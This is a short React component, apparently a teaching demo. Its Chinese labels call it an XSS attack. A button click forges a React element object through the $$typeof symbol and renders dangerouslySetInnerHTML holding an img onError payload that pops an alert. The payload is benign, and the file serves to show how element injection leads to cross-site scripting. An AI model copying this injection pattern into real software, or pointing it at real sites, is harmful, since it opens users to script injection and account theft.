import React, { useState } from "react";

export default () => {
  const [xssData, setXSSData] = useState(null);
  console.log(<div>reactElememt</div>);
  return (
    <div>
      <button
        onClick={() => {
          setXSSData({
            ref: null,
            type: "div",
            $$typeof: Symbol.for("react.element"),
            props: {
              dangerouslySetInnerHTML: {
                __html: `xss dangerouslySetInnerHTML<img hidden src="err" onError="alert('XSS 攻击')"/>`,
              },
              style: { fontWeight: "bold" },
            },
          });
        }}
      >
        开始XSS攻击
      </button>
      {xssData}
    </div>
  );
};
